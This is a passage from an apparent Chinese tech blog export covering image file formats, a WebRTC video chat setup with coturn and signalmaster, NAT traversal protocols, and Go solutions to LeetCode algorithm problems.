特点\n\nBMP文件通常是不[压缩](https://zh.wikipedia.org/wiki/图像压缩)的，所以它们通常比同一幅图像的压缩图像文件格式要大很多。例如，一个800×600的24位几乎占据1.4[MB](https://zh.wikipedia.org/wiki/MB)空间。因此它们通常不适合在[因特网](https://zh.wikipedia.org/wiki/因特网)或者其他低速或者有容量限制的[介质](https://zh.wikipedia.org/wiki/媒介)上进行传输。\n\n现在除了在Windows操作系统中还比较常见之外，我们几乎看不到它。在同样的图片质量下，BMP格式的图片文件大小是GIF格式的很多倍。\n\n\n\n# 3. GIF（1987年)\n\n图像互换格式（英语：Graphics Interchange Format，简称GIF），是无损的、采用索引色的、点阵图。\n\n### 3.1 特点\n\nGIF格式自1987年由CompuServe公司引入后，因其体积小而成像相对清晰，特别适合于初期慢速的互联网。\n\nGIF是无损的，采用GIF格式保存图片不会降低图片质量。同时，GIF格式还具有支持动画以及透明的优点。但，GIF格式仅支持8bit的索引色，即在整个图片中，只能存在256种不同的颜色。\n\nGIF格式适用于对色彩要求不高同时需要文件体积较小的场景，比如企业Logo、线框类的图等。因其体积小的特点，现在GIF被广泛的应用在各类网站中。\n\n\n\n# 4. JPG（1992年）\n\n联合图像专家小组（英语：Joint Photographic Experts Group，缩写：JPEG），JPEG是有损的、采用直接色的、点阵图。\n\n### 4.1 特点\n\nJPEG是一种针对照片影像而广泛使用的有损压缩标准方法。此团队创立于1986年，1992年发布了JPEG的标准而在1994年获得了ISO 10918-1的认定。\n\n使用JPEG格式压缩的图片文件一般也被称为JPEG Files，最普遍被使用的扩展名格式为.jpg，其他常用的扩展名还包括.JPEG、.jpe、.jfif以及.jif。\n\nJPEG的图片的优点，是采用了直接色，得益于更丰富的色彩，jpg可使用的颜色有1600w之多（2^24），而人眼识别的颜色数量大约只有1w多种，因此jpg非常适合色彩丰富图片、渐变色。jpg有损压缩移除肉眼无法识别的图片细节后，可以将图片的尺寸大幅度地减小。\n\n与GIF相比，JPEG不适合用来存储企业Logo、线框类的图。因为有损压缩会导致图片模糊，而直接色的选用，又会导致图片文件较GIF更大。\n\n### 4.2 jpg vs jpeg\n\n两者之间除了字符数没有区别。\n\n全名、正式扩展名是JPEG。但因DOS、Windows 95等早期系统采用的8.3命名规则只支持最长3字符的扩展名，为了兼容采用了.jpg。也因历史习惯和兼容性考虑，.jpg目前更流行。\n\n\n\n# 5. PNG（1997年）\n\n便携式网络图形（英语：Portable Network Graphics，PNG）\n\n### 5.1 特点\n\nPNG于1997年3月作为知识性RFC 2083发布，于2004年作为ISO/IEC标准发布。\n\nPNG是一种支持无损压缩的位图图形格式，支持索引、灰度、RGB三种颜色方案以及Alpha通道等特性。PNG的开发目标是改善并取代GIF作为适合网络传输的格式而不需专利许可，所以被广泛应用于互联网及其他方面上。\n\n### 5.2 PNG-8\n\nPNG-8是PNG的索引色版本。PNG-8是无损的、使用索引色的、点阵图。\n\nPNG是一种比较新的图片格式，PNG-8是非常好的GIF格式替代者，在可能的情况下，应该尽可能的使用PNG-8而不是GIF，因为在相同的图片效果下，PNG-8具有更小的文件体积。除此之外，PNG-8还支持透明度的调节，而GIF并不支持。\n\n现在，除非需要动画的支持，否则我们没有理由使用GIF而不是PNG-8。当然了，PNG-8本身也是支持动画的，只是浏览器支持得不好，不像GIF那样受到广泛的支持。\n\n### 5.3 PNG-24\n\nPNG-24是PNG的直接色版本。PNG-24是无损的、使用直接色的、点阵图。\n\n无损的、使用直接色的点阵图，听起来非常像BMP，是的，从显示效果上来看，PNG-24跟BMP没有不同。PNG-24的优点在于，它压缩了图片的数据，使得同样效果的图片，PNG-24格式的文件大小要比BMP小得多。当然，PNG24的图片还是要比JPEG、GIF、PNG-8大得多。\n\n虽然PNG-24的一个很大的目标，是替换JPEG的使用。但一般而言，PNG-24的文件大小是JPEG的五倍之多，而显示效果则通常只能获得一点点提升。所以，只有在你不在乎图片的文件体积，而想要最好的显示效果时，才应该使用PNG-24格式。\n\n另外，PNG-24跟PNG-8一样，是支持图片透明度的。\n\n\n\n# 6. WebP(2010年)\n\nWebP是谷歌开发的一种新图片格式，WebP是同时支持有损和无损压缩的、使用直接色的、点阵图。\n\n### 6.1 特点\n\nWebP最初在2010年发布，目标是减少文件大小，但达到和[JPEG](https://zh.wikipedia.org/wiki/JPEG)格式相同的图片质量，希望能够减少图片档在网络上的发送时间。\n\n+ 在无损压缩的情况下，相同质量的WebP图片，文件大小要比PNG小26%；\n+ 在有损压缩的情况下，具有相同图片精度的WebP图片，文件大小要比JPEG小25%~34%；\n+ WebP图片格式支持图片透明度，一个无损压缩的WebP图片，如果要支持透明度只需要22%的格外文件大小。\n\n目前webp的还没有得到全面的支持。\n\n\n\n# 7. 对比\n\n| 格式 | 优点                                       | 缺点                               | 适用场景                   |\n| ---- | ------------------------------------------ | ---------------------------------- | -------------------------- |\n| gif  | 文件小，支持动画、透明，无兼容性问题       | 只支持256种颜色                    | 色彩简单的logo、icon、动图 |\n| jpg  | 色彩丰富，文件小                           | 有损压缩，反复保存图片质量下降明显 | 色彩丰富的图片/渐变图像    |\n| png  | 无损压缩，支持透明，简单图片尺寸小         | 不支持动画，色彩丰富的图片尺寸大   | logo/icon/透明图           |\n| webp | 文件小，支持有损和无损压缩，支持动画、透明 | 浏览器兼容性不好                   | 支持webp格式的app和webview |\n\n### 7.1 选择\n\n1. JPG：将其用于复杂图像，相册或图库以及不透明图像。\n2. PNG：最适合用于定义线条的图像，需要透明度的照片以及需要最高质量的照片。\n\n\n\n![图片描述](%E5%B8%B8%E8%A7%81%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F/bV5bmb.png)\n\n\n\n\n\n# 8. 参考资料\n\n+ https://zh.wikipedia.org/wiki/BMP\n+ https://zh.wikipedia.org/wiki/JPEG\n+ https://zh.wikipedia.org/wiki/PNG\n+ https://zh.wikipedia.org/wiki/GIF\n+ https://zh.wikipedia.org/wiki/WebP\n+ https://www.zhihu.com/question/20028452/answer/142593276","tags":["图片"],"categories":["计算机基础"]},{"title":"搭建webRTC视频聊天","url":"%2Fp%2F697b4dfa.html","content":"\n\n\n想在公网上实现视频通信，需要下面3个核心元素：\n\n1. 一个是NAT穿透服务器(ICE Server)，实现内网穿透。\n2. 基于WebSocket的信令服务器(Signaling Server)，用于建立点对点的通道。\n3. Web客户端。通过H5的WebRTC特性调用摄像头，进行用户交互。\n\n<!-- more -->\n\n# 1. 搭建NAT穿透服务器coturn\n\n+ 教程:\n\nhttps://github.com/coturn/coturn/wiki/README\n\n\n\n+ 准备工作: \n\n```shell\nsudo yum install gcc\nsudo yum install openssl-devel\nsudo yum install libevent\nsudo yum install libevent-devel\nsudo yum install sqlite\nsudo yum install sqlite-devel\n\n参见: https://github.com/coturn/coturn/blob/master/INSTALL\n```\n\n\n\n+ 开始安装:\n\n```shell\ngit clone https://github.com/coturn/coturn\n./configure\nmake\nsudo make install\n```\n\n\n\n+ 启动:\n\n```shell\ncp examples/etc/turnserver.conf bin/turnserver.conf\nvi bin/turnserver.conf\n\n修改配置turnserver.conf，如下：\n#监听端口 \nlistening-port=3478 \n#内网IP \nlistening-ip=你的服务器内网IP\n#外网IP地址 \nexternal-ip=你的服务器外网IP\n#访问的用户、密码 \nuser=user:password\n\n\ncd bin\nturnserver -v -r 207.246.80.69:3478 -a -o  //207.246.80.69是我的服务器外网地址\n```\n\n\n\n+ 测试:\n\n打开 [https://webrtc.github.io/samples/src/content/peerconnection/trickle-ice/ ](https://webrtc.github.io/samples/src/content/peerconnection/trickle-ice/)进行测试\n\n![image-20190129145807612](搭建webRTC视频聊天/1.png)\n\n\n\n测试时可以看log (https://github.com/coturn/coturn/wiki/README#logs)\n\n```\ntail -f /var/tmp/turn_日期.log \n```\n\n\n\n\n\n# 2. 搭建信令服务器simplemaster\n\n 信令服务器使用的是 [**signalmaster**](https://github.com/andyet/signalmaster) ，基于websocket。选用它的原因是可以直接集成turn server服务器。\n\n```shell\ngit clone https://github.com/andyet/signalmaster.git\ncd signalmaster\nnpm install express\nnpm install yetify\nnpm install getconfig\nnpm install node-uuid\nnpm install socket.io\n\n\n或者\n\ngit clone https://github.com/nguyenphu160196/signalmaster.git\ncd signalmaster\nnpm install\n```\n\n\n\nsignalmaster可以连接turnserver，但不支持用户名/密码方式，需要对源码sockets.js 110行进行调整，调整后的代码如下：\n\n```javascript\n    if (!config.turnorigins || config.turnorigins.indexOf(origin) !== -1) {\n            config.turnservers.forEach(function (server) {\n                credentials.push({\n                    username: server.username,\n                    credential: server.credential,\n                    urls: server.urls || server.url\n                });\n            });\n        }\n\n```\n\n\n\n完成后，修改config/production.json，配置turnserver的用户和密码，如下：\n\n```json\n{\n  \"isDev\": true,\n  \"server\": {\n    \"port\": 8888,\n    \"/* secure */\": \"/* whether this connects via https */\",\n    \"secure\": false,\n    \"key\": null,\n    \"cert\": null,\n    \"password\": null\n  },\n  \"rooms\": {\n    \"/* maxClients */\": \"/* maximum number of clients per room. 0 = no limit */\",\n    \"maxClients\": 0\n  },\n  \"stunservers\": [\n    {\n      \"urls\": \"stun:stun.ekiga.net:3478\"\n    }\n  ],\n  \"turnservers\": [\n    {\n      \"urls\": [\"turn:www.turn.cn:3478\"],\n      \"username\": \"user\",\n      \"credential\":\"pass\",  \n      \"expiry\": 86400\n    }\n  ]\n}\n```\n\n\n\n启动:\n\n```shell\nnohup node server.js &\n\n//Output:\n&yet -- signal master is running at: http://localhost:8888\n```\n\n\n\n# 3. 搭建Web客户端\n\n复制下面的代码，保存为一个html文件, 放在自己的服务器上\n\n```html\n\n<!DOCTYPE html>\n<html>\n<head>\n    <script src=\"https://code.jquery.com/jquery-1.9.1.js\"></script>\n    <script src=\"http://simplewebrtc.com/latest-v3.js\"></script>\n    <script>\n \n        var webrtc = new SimpleWebRTC({\n            // the id/element dom element that will hold \"our\" video\n            localVideoEl: 'localVideo',\n            // the id/element dom element that will hold remote videos\n            remoteVideosEl: 'remoteVideos',\n            // immediately ask for camera access\n            autoRequestMedia: true,\n            url:'http://207.246.80.69:8888',\n            nick:'nickname'\n        });\n \n \n \n        // we have to wait until it's ready\n        webrtc.on('readyToCall', function () {\n            // you can name it anything\n            webrtc.joinRoom('roomid');\n \n            // Send a chat message\n            $('#send').click(function () {\n                var msg = $('#text').val();\n                webrtc.sendToAll('chat', { message: msg, nick: webrtc.config.nick });\n                $('#messages').append('<br>You:<br>' + msg + '\\n');\n                $('#text').val('');\n            });\n        });\n \n        //For Text Chat ------------------------------------------------------------------\n        // Await messages from others\n        webrtc.connection.on('message', function (data) {\n            if (data.type === 'chat') {\n                console.log('chat received', data);\n                $('#messages').append('<br>' + data.payload.nick + ':<br>' + data.payload.message+ '\\n');\n            }\n        });\n        \n    </script>\n    <style>\n        #remoteVideos video {\n            height: 150px;\n        }\n \n        #localVideo {\n            height: 150px;\n        }\n    </style>\n</head>\n<body>\n    <textarea id=\"messages\" rows=\"5\" cols=\"20\"></textarea><br />\n    <input id=\"text\" type=\"text\" />\n    <input id=\"send\" type=\"button\" value=\"send\" /><br />\n    <video id=\"localVideo\"></video>\n    <div id=\"remoteVideos\"></div>\n</body>\n</html>\n```\n\n\n\nnginx配置:\n\n```nginx\nserver {\n        listen 8080 default_server;\n        listen [::]:8080 default_server;\n\n        root /home/liuwei/web;\n        index index.html;\n}\n```\n\n+ 打开firefox开始测试  http://207.246.80.69:8080, chrome需要https\n\n+ http://simplewebrtc.com/latest-v3.js 可能丢失, 参考https://github.com/andyet/SimpleWebRTC/blob/gh-pages/latest-v3.js\n\n+ 其中url是信令服务器的地址、nickname、roomid根据需要修改\n\n  \n\n  \n\n# 4. 参考资料\n\n+ https://www.cnblogs.com/yubaolee/p/webrtc.html\n\n+ https://blog.csdn.net/csj6346/article/details/81455663","tags":["webrtc"],"categories":["javascript"]},{"title":"nat穿透,stun,turn,ice介绍","url":"%2Fp%2Ff3e0f5f5.html","content":"\n### 1. NAT网络地址转换:  \n\n资料: https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2\n\n\n\n完全圆锥型NAT( Full Cone NAT )\n\n地址限制圆锥型NAT( Address Restricted Cone NAT )\n\n端口限制圆锥型NAT( Port Restricted Cone NAT ) \n\n对称型NAT( Symmetric NAT)\n\n<!-- more -->\n\n### 2. STUN(Session Traversal Utilities for NAT)\n\n资料: <https://zh.wikipedia.org/wiki/STUN>\n\n\n\nSTUN，NAT会话穿越应用程序 <https://tools.ietf.org/html/rfc5389>）是一种[网络协议](https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE)，它允许位于[NAT](https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2)（或多重NAT）后的客户端找出自己的公网地址，查出自己位于哪种类型的NAT之后以及NAT为某一个本地端口所绑定的Internet端端口。这些信息被用来在两个同时处于NAT路由器之后的主机之间创建UDP通信。该协议由RFC 5389定义。\n\n四种主要类型中有三种是可以使用的：[完全圆锥型NAT](https://zh.wikipedia.org/w/index.php?title=%E5%AE%8C%E5%85%A8%E5%9C%86%E9%94%A5%E5%9E%8BNAT&action=edit&redlink=1)、[受限圆锥型NAT](https://zh.wikipedia.org/w/index.php?title=%E5%8F%97%E9%99%90%E5%9C%86%E9%94%A5%E5%9E%8BNAT&action=edit&redlink=1)和[端口受限圆锥型NAT](https://zh.wikipedia.org/w/index.php?title=%E7%AB%AF%E5%8F%A3%E5%8F%97%E9%99%90%E5%9C%86%E9%94%A5%E5%9E%8BNAT&action=edit&redlink=1)——但大型公司网络中经常采用的对称型NAT（又称为双向NAT）则不能使用。\n\n\n\n### 3. TURN(Traversal Using Relay NAT)\n\n资料:  <https://zh.wikipedia.org/wiki/TURN>\n\n\n\nTURN（ <https://tools.ietf.org/html/rfc5766>），是一种数据传输协议（data-transfer protocol）。允许在TCP或UDP的连在线跨越[NAT](https://zh.wikipedia.org/wiki/NAT)或[防火墙](https://zh.wikipedia.org/wiki/%E9%98%B2%E7%81%AB%E5%A2%99)。\n\n\n\n### 4. ICE(Interactive Connectivity Establishment) \n\n资料: https://zh.wikipedia.org/wiki/%E4%BA%92%E5%8B%95%E5%BC%8F%E9%80%A3%E6%8E%A5%E5%BB%BA%E7%AB%8B>\n\n\n\nice是一种综合性的[NAT穿越](https://zh.wikipedia.org/wiki/NAT%E7%A9%BF%E8%B6%8A)的技术, 是由[IETF](https://zh.wikipedia.org/wiki/IETF)的MMUSIC工作组开发出来的一种framework，可集成各种[NAT穿透](https://zh.wikipedia.org/wiki/NAT%E7%A9%BF%E9%80%8F)技术，如[STUN](https://zh.wikipedia.org/wiki/STUN)、[TURN](https://zh.wikipedia.org/wiki/TURN)（Traversal Using Relay NAT，中继NAT实现的穿透）、RSIP（Realm Specific IP，特定域IP）等。该framework可以让SIP的客户端利用各种NAT穿透方式打穿远程的[防火墙](https://zh.wikipedia.org/wiki/%E9%98%B2%E7%81%AB%E5%A2%99)。\n\n\n\n### 5. 三个协议介绍\n\n资料:  <https://blog.csdn.net/byxdaz/article/details/52786600>  \n","tags":["nat"],"categories":["系统"]},{"title":"7算法-动态规划","url":"%2Fp%2Fa80d0031.html","content":"\n\n\n# 1. 动态规划\n\n看个小故事:\n\n```\n*writes down \"1+1+1+1+1+1+1+1 =\" on a sheet of paper*\n\n\"What's that equal to?\"\n\n*counting* \"Eight!\"\n\n*writes down another \"1+\" on the left*\n\n\"What about that?\"\n\n*quickly* \"Nine!\"\n\n\"How'd you know it was nine so fast?\"\n\n\"You just added one more\"\n\n\"So you didn't need to recount because you remembered there were eight!Dynamic Programming is just a fancy way to say 'remembering stuff to save time later'\"\n```\n\n<!-- more -->\n\n按照定义，动态规划是把一个大问题拆解成一堆小问题，这个本身没啥问题，但是我觉得的这个不是动态规划的核心思想，或者说，一个”大问题“之所以能用”动态规划“解决，并不是因为它能拆解成一堆小问题，事实上啥大问题都能拆解成小问题...\n\n**取决于该问题是否能用动态规划解决的是这些”小问题“会不会被被重复调用。**\n\n\n\n# 2. 算法\n\n### 2.1 [连续子数组的最大和](https://leetcode-cn.com/problems/lian-xu-zi-shu-zu-de-zui-da-he-lcof/)(简单)\n\n+ 动态规划, 用到临时存结果\n\n+ 临时结果, 有前因后果关系, 想想8+1\n\n```go\nfunc maxSubArray(nums []int) int {\n    dp := make([]int, len(nums))\n    dp[0] = nums[0]\n    max := dp[0]\n    for i := 1; i < len(nums); i++ {\n        dp[i] = Max(dp[i-1]+nums[i], nums[i])\n        max = Max(dp[i], max)\n    }\n    return max\n}\n\nfunc Max(a, b int) int {\n    if a < b {\n        return b\n    }\n    return a\n}\n```\n\n### 2.2 [青蛙跳台阶问题](https://leetcode-cn.com/problems/qing-wa-tiao-tai-jie-wen-ti-lcof/)(简单)\n\n+ 递归超时\n\n```go\nfunc numWays(n int) int {\n    if n <= 1 {\n        return 1\n    }\n    dp := make([]int,n+1)\n    dp[0]= 1\n    dp[1]= 1\n\n    for i:=2; i <= n; i++{\n        dp[i] = (dp[i-1] + dp[i-2])%1000000007\n    }\n\n    return dp[n]\n}\n```\n\n\n\n### 2.3 [斐波那契数列](https://leetcode-cn.com/problems/fei-bo-na-qi-shu-lie-lcof/)(简单)\n\n```go\nfunc fib(n int) int {\n    if n <= 1 {\n        return n\n    }\n\n    f1, f2 := 0, 1\n    for i := 2; i <= n; i++{\n        temp := (f1 + f2)%1000000007\n        f1 = f2\n        f2 = temp\n    }\n\n    return f2\n}\n```\n\n\n\n\n\n# 3. 参考资料\n\n+ https://www.zhihu.com/question/39948290/answer/612439961\n","tags":["算法"],"categories":["算法"]},{"title":"6算法-综合","url":"%2Fp%2Fb4481ffc.html","content":"\n### 1. [LRU 缓存机制](https://leetcode-cn.com/problems/lru-cache/)(中等)\n\n```go\ntype LRUCache struct {\n    Capacity int\n    Map map[int]int\n    List []int\n}\n\n\nfunc Constructor(capacity int) LRUCache {\n  return LRUCache{\n        Capacity : capacity,\n        Map : make(map[int]int, 0),\n        List : make([]int, 0),\n    }\n}\n\nfunc DelKey(a []int, key int) []int{\n    for i := 0; i < len(a); i++ {\n\t\tif a[i] == key {\n            return append(a[:i], a[i+1:]...)\n\t\t}\n\t}\n\treturn a[1:len(a)]\n}\n\nfunc (this *LRUCache) Get(key int) int {\n    if val, ok := this.Map[key]; ok{\n        this.List = DelKey(this.List, key)\n        this.List = append(this.List, key)\n        return val\n    }\n    return -1\n}\n\n\nfunc (this *LRUCache) Put(key int, value int)  {\n\n    if _, ok := this.Map[key]; ok{\n        this.Map[key] = value\n        this.List = DelKey(this.List, key)\n        this.List = append(this.List, key)\n        return \n    }\n\n    if len(this.Map) >= this.Capacity{\n        delKey := this.List[0]      \n        this.List = DelKey(this.List, key)\n        delete(this.Map, delKey)\n    }\n\n    this.Map[key] = value\n    this.List = append(this.List, key)\n}\n```\n\n<!-- more -->\n\n### 2. [ 顺时针打印矩阵](https://leetcode-cn.com/problems/shun-shi-zhen-da-yin-ju-zhen-lcof/)\n\n```go\nfunc spiralOrder(matrix [][]int) []int {\n    if len(matrix) == 0 || len(matrix[0]) == 0{\n        return []int{}\n    }\n\n    res := []int{}\n    l := 0\n    r := len(matrix[0]) - 1\n    t := 0\n    b :=  len(matrix) - 1\n\n    for {\n        // 左到右\n        for i := l ; i <= r; i++ {\n            res = append(res, matrix[t][i])\n        }\n        t++\n        if t > b {\n           break \n        }\n\n        // 右到下\n        for i := t; i <= b; i++ {\n            res = append(res, matrix[i][r])\n        }\n\n        r--\n        if l > r {\n            break\n        }\n\n        // 下到左\n        for i := r; i >= l; i-- {\n            res = append(res, matrix[b][i])\n        }\n        b--\n        if t > b {\n           break \n        }\n\n\n        // 左到上\n        for i := b; i >= t; i-- {\n            res = append(res, matrix[i][l])\n        }\n        l++\n        if l > r {\n            break\n        }\n    }\n\n    return res\n}\n```\n\n\n\n### 3. [每日温度](https://leetcode-cn.com/problems/daily-temperatures/)(中等)TODO\n\n","tags":["算法"],"categories":["算法"]},{"title":"5算法-查找排序TOPK","url":"%2Fp%2Fb24fd949.html","content":"\n# 1. 查找\n\n### 1 [二分查找](https://leetcode-cn.com/problems/binary-search/)(简单) \n\n+ （外面小于等于，里面小于，和快排相反）\n\n```go\nfunc search(nums []int, target int) int {    \n    left := 0 \n    right := len(nums)-1\n  \n    for left <= right {  // 这里是小于等于\n        mid := (left + right)/2\n        if nums[mid] > target{\n            right = mid - 1 \n        }else if nums[mid] < target{\n          left = mid  + 1\n        }else {\n         return mid\n        }\n    }\n    return -1 // 找不到 return -1\n}\n```\n\n<!-- more -->\n\n\n# 2. 排序\n\n### 1 快速排序\n\n+ https://www.liuvv.com/p/ff8068c0.html\n\n+ https://leetcode-cn.com/problems/sort-an-array/\n\n+ （循环套循环）（外层小于，里层小于等于，和二分相反）（停止相遇要交换）\n\n  ```go\n  func main() {\n  \tarr := []int{2, 1}\n  \tfmt.Println(\"origin\", arr)\n  \tQuickSort(arr, 0, len(arr)-1)\n  \tfmt.Println(\"sort\", arr)\n  }\n  \n  func QuickSort(arr []int, left int, right int) {\n  \tif left < right {\n  \t\tpartIndex := PartIndex(arr, left, right)\n  \t\tQuickSort(arr, left, partIndex-1)\n  \t\tQuickSort(arr, partIndex+1, right)\n  \t}\n  }\n  \n  func PartIndex(arr []int, left int, right int) int {\n  \tmid := arr[left]\n  \torigin := left\n  \tfor left < right {\n  \t\tfor arr[right] >= mid && left < right {\n  \t\t\tright--\n  \t\t}\n  \t\tfor arr[left] <= mid && left < right {\n  \t\t\tleft++\n  \t\t}\n  \t\tarr[left], arr[right] = arr[right], arr[left]\n  \t}\n  \n  \tarr[left], arr[origin] = arr[origin], arr[left]\n  \treturn left\n  }\n  ```\n\n\n\n### 2 堆排序\n\n+ https://www.bilibili.com/video/BV1Eb41147dK\n+ https://www.bilibili.com/video/BV1fp4y1D7cj\n\n堆是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。最大堆通常被用来进行\"升序\"排序，而最小堆通常被用来进行\"降序\"排序。\n\n##### 1. 先维护堆性质的函数\n\n与自己的孩子交换，交换后递归交换。\n\n<img src=\"5算法-查找排序TOPK/alg-sort-heap-1.jpg\" alt=\"img\" style=\"zoom:80%;\" />\n\n##### 2. 再构建大顶堆\n\n将待排序的序列建成大根堆。\n\n需要有维护堆性质的函数，从后往前调用构建堆就可以了。\n\n##### 3. 不停交换达到堆排序\n\n1. 我们将堆顶其与末尾元素交换，使末尾元素为最大值，然后再调整堆顶元素使得剩下的 n−1 个元素仍为大根堆\n\n2. 再重复 2 的操作我们即能得到一个有序的序列。\n\n   \n\n```go\npackage main\n\nimport \"fmt\"\n\n// 1. 维护堆的性质\nfunc heap(arr []int, length int, index int) {\n\tmaxIndex := index\n\tlChildIndex := 2*index + 1\n\trChildIndex := 2*index + 2\n\n\tif lChildIndex < length && arr[lChildIndex] > arr[maxIndex] {\n\t\tmaxIndex = lChildIndex\n\t}\n\tif rChildIndex < length && arr[rChildIndex] > arr[maxIndex] {\n\t\tmaxIndex = rChildIndex\n\t}\n\tif maxIndex != index { // 说明孩子有比自己大的\n\t\tarr[maxIndex], arr[index] = arr[index], arr[maxIndex]\n\t\theap(arr, length, maxIndex)\n\t}\n}\n\nfunc main() {\n\tarr := []int{2, 1, 10, 9, 10, 88, 17}\n\tfmt.Println(\"origin\", arr) //[2 1 10 9 10 88 17]\n\n\t// 2. 构建大顶堆\n\tlength := len(arr)\n\tfor i := (length - 1) / 2; i >= 0; i-- {\n\t\theap(arr, length, i)\n\t}\n\tfmt.Println(\"heap\", arr) // [88 10 17 9 1 10 2]\n\n\t// 3. 堆排序\n\tfor i := length - 1; i >= 0; i-- {\n\t\tarr[i], arr[0] = arr[0], arr[i]\n\t\theap(arr, i, 0)\n\t}\n\tfmt.Println(\"heap_sort\", arr) // [1 2 9 10 10 17 88]\n}\n\n\n```\n\n\n\n# 3  TopK\n\n> 参考堆排序代码，先建堆。\n\n### 1 [最小的k个数](https://leetcode-cn.com/problems/zui-xiao-de-kge-shu-lcof/)(简单🔥) [最小K个数](https://leetcode-cn.com/problems/smallest-k-lcci/)(中等)\n\n使用大顶堆，和堆顶比较，堆顶大就直接换掉，接下来这个堆就是数字最小的大顶堆。\n\n```go\npackage main\n\nimport \"fmt\"\n\n// 建堆\nfunc buildHeap(arr []int, size int) {\n\tfor i := size / 2; i >= 0; i-- {\n\t\theapify(arr, i, size)\n\t}\n}\n\n// 维护堆\nfunc heapify(arr []int, index int, length int) {\n\tl := index*2 + 1\n\tr := index*2 + 2\n\n\tmaxIndex := index\n\tif l < length && arr[l] > arr[maxIndex] {\n\t\tmaxIndex = l\n\t}\n\tif r < length && arr[r] > arr[maxIndex] {\n\t\tmaxIndex = r\n\t}\n\n\tif maxIndex != index {\n\t\tarr[maxIndex], arr[index] = arr[index], arr[maxIndex]\n\t\theapify(arr, maxIndex, length)\n\t}\n}\n\nfunc getLeastNumbers(arr []int, k int) []int {\n\n\tbuildHeap(arr, k)\n\n\tfor i := k; i < len(arr); i++ {\n\t\tif arr[i] < arr[0] {\n\t\t\tarr[i], arr[0] = arr[0], arr[i]\n\t\t\theapify(arr, 0, k)\n\t\t}\n\t}\n\tvar res []int\n\tfor i := 0; i < k; i++ {\n\t\tres = append(res, arr[i])\n\t}\n\treturn res\n\n}\n\nfunc main() {\n\tarr := []int{2, 1, 10, 9, 10, 88, 17}\n\tfmt.Println(\"least4\", getLeastNumbers(arr, 3)) // 9 1 2\n\tfmt.Println(\"least2\", getLeastNumbers(arr, 2)) // 2 1\n}\n```\n\n\n\n### 2 [数组中的第K个最大元素](https://leetcode-cn.com/problems/kth-largest-element-in-an-array/)(中等🔥)\n\n使用的大顶堆, 需要全入堆\n\n```go\nfunc buildHeap(arr []int, size int) {\n\tfor i := size / 2; i >= 0; i-- {\n\t\theapify(arr, i, size)\n\t}\n}\n\nfunc heapify(arr []int, index int, length int) {\n\tl := index*2 + 1\n\tr := index*2 + 2\n\n\ttemp := index\n\tif l < length && arr[l] > arr[temp] {\n\t\ttemp = l\n\t}\n\tif r < length && arr[r] > arr[temp] {\n\t\ttemp = r\n\t}\n\n\tif temp != index {\n\t\tarr[temp], arr[index] = arr[index], arr[temp]\n\t\theapify(arr, temp, length)\n\t}\n}\n\n\n\nfunc findKthLargest(nums []int, k int) int {\n\tbuildHeap(nums, len(nums))\n\n\tlength := len(nums) - 1\n\tfor i := 0; i < k; i++ {\n\t\tnums[0], nums[length] = nums[length], nums[0]\n\t\tlength--\n\t\theapify(nums, 0, length)\n\t}\n\treturn nums[len(nums)-k]\n}\n```\n\n\n\n### 3 [前 K 个高频元素](https://leetcode-cn.com/problems/top-k-frequent-elements/)(中等)TODO\n\n\n\n# 4. 参考资料\n\n+ https://lyl0724.github.io/2020/01/25/1/","tags":["算法"],"categories":["算法"]},{"title":"4算法-字符串","url":"%2Fp%2Fb50adb48.html","content":"\n### + [ 翻转单词顺序](https://leetcode-cn.com/problems/fan-zhuan-dan-ci-shun-xu-lcof/)(简单)\n\n```go\nfunc reverseWords(s string) string {\n\n    s = strings.TrimSpace(s)\n\n    j := len(s)-1\n    i := j\n    res := []string{}\n    for i >= 0 {\n        for i >= 0 &&  s[i] != ' '{\n            i--\n        }\n        res = append(res, s[i+1:j+1])\n        for i >= 0 &&  s[i] == ' '{\n            i--\n        }\n        j = i\n\n    }\n\n    return strings.Join(res,\" \")\n}\n```\n\n### + [罗马数字转整数](https://leetcode-cn.com/problems/roman-to-integer/)(简单)\n\n```go\nfunc romanToInt(s string) int {\n  res := map[string]int{\n        \"I\": 1,\n        \"V\": 5,\n        \"X\": 10,\n        \"L\": 50,\n        \"C\": 100,\n        \"D\": 500,\n        \"M\": 1000,\n    }\n    sum := 0\n    for i := 0; i < len(s); i++ {\n        val := res[string(s[i])]\n        if i < len(s)-1 && val < res[string(s[i+1])] {\n            sum -= val\n        } else {\n            sum += val\n        }\n    }\n    return sum\n}\n```\n\n","tags":["算法"],"categories":["算法"]},{"title":"3算法-树","url":"%2Fp%2F3850b4cc.html","content":"\n\n\n> 两个套路，一个是递归遍历二叉树traverse() 无返回值 ，一个是分解处理子数，有返回值。\n\n综上，遇到一道二叉树的题目时的通用思考过程是：\n\n**1、是否可以通过遍历一遍二叉树得到答案**？如果可以，用一个 `traverse` 函数配合外部变量来实现。\n\n**2、是否可以定义一个递归函数，通过子问题（子树）的答案推导出原问题的答案**？如果可以，写出这个递归函数的定义，并充分利用这个函数的返回值。\n\n**3、无论使用哪一种思维模式，你都要明白二叉树的每一个节点需要做什么，需要在什么时候（前中后序）做**。\n\n<!-- more -->\n\n# 1. 常考\n\n### 1.1 二叉树的最大深度\n\n+ https://leetcode.cn/problems/maximum-depth-of-binary-tree/\n+ 遍历二叉树\n\n```go\n\nvar res int // 记录最大深度\nvar depth int // 记录遍历到的节点的深度\n\n\nfunc maxDepth(root *TreeNode) int {\n\ttraverse(root)\n\treturn res\n}\n\nfunc traverse(root *TreeNode) {\n\tif root == nil {\n\t\treturn\n\t}\n\tdepth++\n\tif root.Left == nil && root.Right == nil {\n\t\tres = max(res, depth) \t\t// 到达叶子节点，更新最大深度\n\t}\n\ttraverse(root.Left)\n\ttraverse(root.Right)\n\tdepth--\n}\n\nfunc max(a, b int) int {\n\tif a > b {\n\t\treturn a\n\t}\n\treturn b\n}\n```\n\n+ 分解问题\n\n```go\nfunc maxDepth(root *TreeNode) int {\n    if root == nil {\n        return 0\n    }\n\n    left := maxDepth(root.Left)\n    right := maxDepth(root.Right)\n    return Max(left,right)+1\n}\n// 但为什么主要的代码逻辑集中在后序位置？\n// 